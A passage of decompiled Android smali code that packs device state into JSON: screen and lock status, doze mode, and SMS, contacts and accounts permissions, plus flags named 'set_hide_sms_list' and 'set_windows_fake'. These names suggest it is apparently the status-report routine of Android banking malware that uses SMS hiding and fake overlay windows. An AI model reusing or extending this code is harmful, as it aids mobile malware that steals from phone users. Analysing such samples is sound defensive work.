    invoke-virtual {p1, p2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p2, "screen"

    sget-object v0, Lh0/a;->a:Lh0/a;

    const-string v0, "display"

    .line 20
    invoke-virtual {p3, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "null cannot be cast to non-null type android.hardware.display.DisplayManager"

    invoke-static {v0, v1}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    check-cast v0, Landroid/hardware/display/DisplayManager;

    invoke-virtual {v0}, Landroid/hardware/display/DisplayManager;->getDisplays()[Landroid/view/Display;

    move-result-object v0

    const-string v1, "dm.displays"

    invoke-static {v0, v1}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    array-length v1, v0

    move v3, v5

    move v4, v3

    :cond_10
    :goto_c
    if-ge v3, v1, :cond_11

    aget-object v8, v0, v3

    add-int/lit8 v3, v3, 0x1

    invoke-virtual {v8}, Landroid/view/Display;->getState()I

    move-result v8

    if-eq v8, v6, :cond_10

    move v4, v6

    goto :goto_c

    .line 21
    :cond_11
    invoke-static {v4}, Ljava/lang/String;->valueOf(Z)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, p2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p2, "isKeyguardLocked"

    sget-object v0, Lh0/a;->a:Lh0/a;

    const-string v1, "keyguard"

    .line 22
    invoke-virtual {p3, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    const-string v3, "null cannot be cast to non-null type android.app.KeyguardManager"

    invoke-static {v1, v3}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    check-cast v1, Landroid/app/KeyguardManager;

    invoke-virtual {v1}, Landroid/app/KeyguardManager;->isKeyguardLocked()Z

    move-result v1

    .line 23
    invoke-static {v1}, Ljava/lang/String;->valueOf(Z)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, p2, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p2, "is_dozemode"

    invoke-virtual {v0, p3}, Lh0/a;->p(Landroid/content/Context;)Z

    move-result v0

    invoke-static {v0}, Ljava/lang/String;->valueOf(Z)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, p2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p2, "sms"

    sget-object v0, Lb0/b;->a:Lb0/b;

    .line 24
    sget-object v0, Lb0/b;->q:Ljava/lang/String;

    .line 25
    invoke-static {v0, v2}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {p3, v0}, Landroid/content/Context;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result v1

    if-eqz v1, :cond_12

    move v1, v5

    goto :goto_d

    :cond_12
    move v1, v6

    .line 26
    :goto_d
    invoke-static {v1}, Ljava/lang/String;->valueOf(Z)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, p2, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p2, "set_contact_list"

    .line 27
    sget-object v1, Lb0/b;->t:Ljava/lang/String;

    .line 28
    invoke-static {v1, v2}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {p3, v1}, Landroid/content/Context;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result v1

    if-eqz v1, :cond_13

    move v1, v5

    goto :goto_e

    :cond_13
    move v1, v6

    .line 29
    :goto_e
    invoke-static {v1}, Ljava/lang/String;->valueOf(Z)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, p2, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p2, "set_hide_sms_list"

    .line 30
    invoke-static {p3}, Landroid/provider/Telephony$Sms;->getDefaultSmsPackage(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p3}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-static {v1, v3}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_16

    .line 31
    invoke-virtual {p3, v0}, Landroid/content/Context;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_14

    move v0, v5

    goto :goto_f

    :cond_14
    move v0, v6

    :goto_f
    if-eqz v0, :cond_16

    .line 32
    sget-object v0, Lb0/b;->s:Ljava/lang/String;

    .line 33
    invoke-static {v0, v2}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {p3, v0}, Landroid/content/Context;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_15

    move v0, v5

    goto :goto_10

    :cond_15
    move v0, v6

    :goto_10
    if-eqz v0, :cond_16

    move v0, v6

    goto :goto_11

    :cond_16
    move v0, v5

    .line 34
    :goto_11
    invoke-static {v0}, Ljava/lang/String;->valueOf(Z)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, p2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p2, "set_windows_fake"

    .line 35
    sget-object v0, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v0}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v1, "permission_get"

    invoke-interface {v0, v1, v7}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_17

    goto :goto_12

    :cond_17
    move-object v7, v0

    .line 36
    :goto_12
    const-string v0, "1"

    invoke-static {v7, v0}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    invoke-static {v0}, Ljava/lang/String;->valueOf(Z)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, p2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p2, "set_accounts"

    .line 37
    sget-object v0, Lb0/b;->u:Ljava/lang/String;

    .line 38
    invoke-static {v0, v2}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {p3, v0}, Landroid/content/Context;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result p3

    if-eqz p3, :cond_18

    goto :goto_13

    :cond_18
    move v5, v6

    .line 39
    :goto_13
    invoke-static {v5}, Ljava/lang/String;->valueOf(Z)Ljava/lang/String;

    move-result-object p3

    invoke-virtual {p1, p2, p3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_3

    :catch_3
    return-void
.end method
